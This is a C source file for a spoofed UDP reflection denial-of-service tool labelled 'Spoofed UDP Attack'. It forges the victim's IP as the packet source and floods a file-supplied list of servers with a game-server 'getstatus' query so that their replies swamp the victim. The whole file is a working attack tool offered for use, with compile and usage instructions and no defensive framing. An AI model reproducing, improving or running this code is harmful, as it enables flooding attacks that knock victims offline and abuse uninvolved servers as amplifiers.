/*
  
	--Note by MFJC--
	Compile:
		apt-get update
		apt-get install gcc
		gcc udp.c -pthread
	Usage: ./a.out ip port time ipfile.txt message
*/
#include <stdio.h>
#include <stdlib.h>
#include <netinet/tcp.h>
#include <netinet/udp.h>
#include <netinet/ip.h>
#include <pthread.h>

void D(char *message)
{
	printf(message);
	fflush(stdout);
}

typedef struct file_list
{
	unsigned long ip;
	int port;
};

typedef struct pthread_param
{
	unsigned long victim_ip;
	int victim_port;
	struct file_list *list;
	int list_size;
	char *message;
};

typedef struct pseudo_header
{
    unsigned int source_address;
    unsigned int dest_address;
    unsigned char placeholder;
    unsigned char protocol;
    unsigned short tcp_length;
    struct tcphdr tcp;
};

void attack(unsigned long srcip, int srcport, unsigned long destip, int destport, char *message)
{
    int s = socket (PF_INET, SOCK_RAW, IPPROTO_UDP);
    char packet[4096];
    struct iphdr *iph = (struct iphdr *) packet;
    // struct tcphdr *tcph = (struct tcphdr *) (packet + sizeof (struct ip));
	struct udphdr *udph = (struct udphdr *) (packet + sizeof(struct ip));
    struct sockaddr_in sin;
    struct pseudo_header psh;
 
    sin.sin_family = AF_INET;
    sin.sin_port = htons(destport);
    sin.sin_addr.s_addr = destip;
 
    memset (packet, 0, 4096);
 
    iph->ihl = 5;
    iph->version = 4;
    iph->tos = 16;
    iph->tot_len = sizeof (struct ip) + sizeof (struct udphdr) + strlen(message);
    iph->id = htonl (54321); 
    iph->frag_off = 0;
    iph->ttl = 255;
    iph->protocol = IPPROTO_UDP;
    iph->check = 0; 
    iph->saddr = srcip; 
    iph->daddr = sin.sin_addr.s_addr;
 
	udph->source = htons(srcport);
    // Destination port number
    udph->dest = htons(destport);
    udph->len = htons(sizeof(struct udphdr));
	udph->check = 0; //Kernel fill this in?
	
	strncpy((char *)udph + sizeof (struct udphdr),message, 4096 - (sizeof (struct udphdr) + sizeof (struct ip)));
	
    //IP_HDRINCL needed for own headers
	int one = 1;
	const int *val = &one;
	if (setsockopt (s, IPPROTO_IP, IP_HDRINCL, val, sizeof (one)) < 0)
	{
		printf ("[x] Cannot set socket options (are we r00t?)\n");
		return;
	}
 
	if (sendto (s, packet, iph->tot_len, 0, (struct sockaddr *) &sin, sizeof (sin)) < 0)
		printf ("[x] Error sending packet\n");
 
	close(s);
    return;
}

void *thread_attack(void *thread_params)
{
	struct pthread_param *params = thread_params;
	int i;
	
	while (1)
		for (i = 0; i < params->list_size; i++)
			attack(params->victim_ip, rand() % 65534 + 1, params->list[i].ip, params->list[i].port, params->message);
			// Hmm should we use random port or params->victim_port?
}
 
char *getLine(FILE *f)
{
	char *buffer = malloc(sizeof(char));
	int pos = 0;
	char c;

	do { // read one line
		c = fgetc(f);
		if(c != EOF) buffer[pos++] = (char)c;
		buffer = (char*)realloc(buffer, sizeof(char) * (pos + 2));
	} while (c != EOF && c != '\n');
	
	return buffer;
} 
 
int main (int argc, char *argv[])
{
	struct file_list *list = NULL;
	int list_size = 0;
	
	struct pthread_param param;
	pthread_t udp_attack;
	
	printf("Spoofed UDP Attack\n");
	printf("          by eKKiM\n");
	printf("          for Orgy\n\n");
	
	if (argc != 6)
	{
		printf("Usage: %s <destip> <destport> <ip_file_list> <time in seconds> <message>\n", argv[0]);
		return -1;
	}
	
	srand(time(0));
	
	FILE *pFile = fopen(argv[3], "r");
	if (pFile == NULL)
	{
		printf("[X] Cannot open file\n");
		return -1;
	}
	
	while (!feof(pFile))
	{
		char *line;
		line = getLine(pFile);
		char ip[1024];
		int port;

		if (sscanf(line, "%99[^:]:%99d", ip, &port) == 2)
		{
			list_size++;
			list = (struct file_list *) realloc(list, sizeof(struct file_list) * list_size);
			list[list_size - 1].ip = inet_addr(ip);
			list[list_size - 1].port = port;
		}
		free(line);
	}
	
	fclose(pFile);
	
	param.victim_ip = inet_addr(argv[1]);
	param.victim_port = atoi(argv[2]);
	
	param.list = list;
	param.list_size = list_size;
	
	param.message = "\xFF\xFF\xFF\xFF\x67\x65\x74\x73\x74\x61\x74\x75\x73\x10";

	pthread_create( &udp_attack, NULL, thread_attack, (void*) &param);
	
	printf("[*] Attacking..\n");
	sleep(atoi(argv[4]));
	printf("[!] Done\n");
	return 0;
}